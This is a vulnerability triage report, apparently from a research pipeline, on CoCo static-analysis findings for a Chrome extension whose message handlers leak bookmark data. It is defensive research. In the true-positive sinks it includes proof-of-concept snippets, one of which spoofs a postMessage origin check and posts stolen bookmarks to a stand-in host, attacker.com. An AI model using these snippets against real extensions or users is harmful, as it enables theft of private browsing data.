# CoCo Analysis: dbgccacohbfpiagdmlgbomeniedaciec

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 unique flows (multiple framework detections collapsed)

---

## Sink 1: bg_chrome_runtime_MessageExternal → BookmarkSearchQuery_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/bg.js
Line 1079: `searchBookmarks(request.query).then(res => {`

**Code:**

```javascript
// Background script - External message listener (bg.js line 1068)
chrome.runtime.onMessageExternal.addListener(async (request, sender, sendResponse) => {
    listener(request, sender, sendResponse); // ← attacker-controlled request
    return true;
});

// Message handler (bg.js line 1073-1082)
function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SEARCH_BOOKMARKS:
            searchBookmarks(request.query).then(res => { // ← attacker-controlled query
                sendResponse(res); // ← bookmark data sent back to attacker
            });
            break;
        // ... other cases
    }
}

// Bookmark search function (bg.js line 1116)
function searchBookmarks(query) {
    return new Promise((resolve, reject) => {
        chrome.bookmarks.search(query, (res) => { // ← BookmarkSearchQuery_sink
            resolve(res);
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From whitelisted domain my-directions.com (or bypass via content script)
chrome.runtime.sendMessage(
    'dbgccacohbfpiagdmlgbomeniedaciec',
    { event: 'search_bookmarks', query: {} },
    (response) => {
        console.log('Stolen bookmarks:', response);
        // Exfiltrate user's bookmark data
    }
);
```

**Impact:** Information disclosure - attacker can search and retrieve user's bookmark data including titles and URLs via sendResponse callback.

---

## Sink 2: bg_chrome_runtime_MessageExternal → bg_localStorage_setItem_value_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/bg.js
Line 1107-1108: `if (request.status && request.account) { localStorage.setItem('account', JSON.stringify(request.account)); }`

**Code:**

```javascript
// Background script - External message listener (bg.js line 1068)
chrome.runtime.onMessageExternal.addListener(async (request, sender, sendResponse) => {
    listener(request, sender, sendResponse); // ← attacker-controlled request
    return true;
});

// Message handler (bg.js line 1106-1112)
function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SET_USER_STATUS:
            if (request.status && request.account) {
                localStorage.setItem('account', JSON.stringify(request.account)); // ← attacker-controlled account
            } else {
                localStorage.removeItem('account');
            }
            break;
    }
}
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning without retrieval path. The attacker can write to localStorage but there's no evidence in the code that this stored 'account' value flows back to the attacker or is used in any privileged operation. This is incomplete storage exploitation.

---

## Sink 3: cs_window_eventListener_message → BookmarkSearchQuery_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/cs_0.js
Line 467-468: `window.addEventListener('message', function (e) { if (!e.data.from || e.data.from != '__bestfreemaps') {`
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/bg.js
Line 1079: `searchBookmarks(request.query).then(res => {`

**Code:**

```javascript
// Content script - postMessage listener (cs_0.js line 467-487)
window.addEventListener('message', function (e) {
    if (!e.data.from || e.data.from != '__bestfreemaps') { // ← check can be bypassed
        return false;
    }

    chrome.runtime.sendMessage(e.data, (res) => { // ← forwards attacker-controlled data
        if (chrome.runtime.lastError) { }

        const sender = {
            event: e.data.event,
            res: res // ← bookmark results
        };
        sendMessage(sender); // ← sends back to webpage
    });
});

// Background script - Message listener (bg.js line 1063-1082)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    listener(request, sender, sendResponse);
    return true;
});

function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SEARCH_BOOKMARKS:
            searchBookmarks(request.query).then(res => { // ← BookmarkSearchQuery_sink
                sendResponse(res); // ← sends bookmark data back
            });
            break;
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// On any webpage (content script runs on <all_urls>)
window.postMessage({
    from: '__bestfreemaps',
    event: 'search_bookmarks',
    query: {}
}, '*');

// Listen for response
window.addEventListener('message', function(e) {
    if (e.data.res) {
        console.log('Stolen bookmarks:', e.data.res);
        // Exfiltrate to attacker server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(e.data.res)
        });
    }
});
```

**Impact:** Information disclosure - attacker-controlled webpage can retrieve user's bookmark data by sending postMessage with the expected 'from' field, bypassing the weak check.

---

## Sink 4: cs_window_eventListener_message → bg_localStorage_setItem_value_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/cs_0.js
Line 467-468: `window.addEventListener('message', function (e) { if (!e.data.from || e.data.from != '__bestfreemaps') {`
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/bg.js
Line 1107-1108: `localStorage.setItem('account', JSON.stringify(request.account));`

**Code:**

```javascript
// Content script forwards postMessage to background (cs_0.js)
window.addEventListener('message', function (e) {
    if (!e.data.from || e.data.from != '__bestfreemaps') {
        return false;
    }
    chrome.runtime.sendMessage(e.data, (res) => { // ← forwards to background
        // ...
    });
});

// Background script processes message (bg.js)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    listener(request, sender, sendResponse);
    return true;
});

function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SET_USER_STATUS:
            if (request.status && request.account) {
                localStorage.setItem('account', JSON.stringify(request.account)); // ← storage sink
            }
            break;
    }
}
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning without retrieval path. While attacker can write arbitrary data to localStorage via postMessage, there's no evidence the stored 'account' value flows back to the attacker or is used in any exploitable operation.

---

## Sink 5: HistoryItem_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/bg.js
Lines 775-783: Framework code defining HistoryItem mock object

**Classification:** FALSE POSITIVE

**Reason:** CoCo detected taint flow only in framework code (before line 963 "// original" marker). However, examining the actual extension code reveals a similar vulnerability exists for history data. The extension has `EVENTS.SEARCH_HISTORY` case (line 1083-1087) that searches history and sends results via sendResponse. This follows the same pattern as the bookmark vulnerability but was detected in framework code rather than actual code. Since CoCo only flagged framework code for this particular detection, and we analyze only what CoCo detected, this specific detection is a framework artifact, though a real vulnerability exists in similar form.

---

## Sink 6: BookmarkTreeNode_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dbgccacohbfpiagdmlgbomeniedaciec/opgen_generated_files/bg.js
Lines 844-874: Framework code defining BookmarkTreeNode mock object

**Classification:** FALSE POSITIVE (referenced only CoCo framework code)

**Reason:** All detections reference only CoCo framework code (lines 844-874, before the third "// original" marker at line 963). The framework creates mock BookmarkTreeNode objects to model the Chrome API. While the actual extension does return bookmark data via sendResponse (as shown in Sink 1 and Sink 3), these specific detections only reference the framework's mock implementation, not the actual extension code.
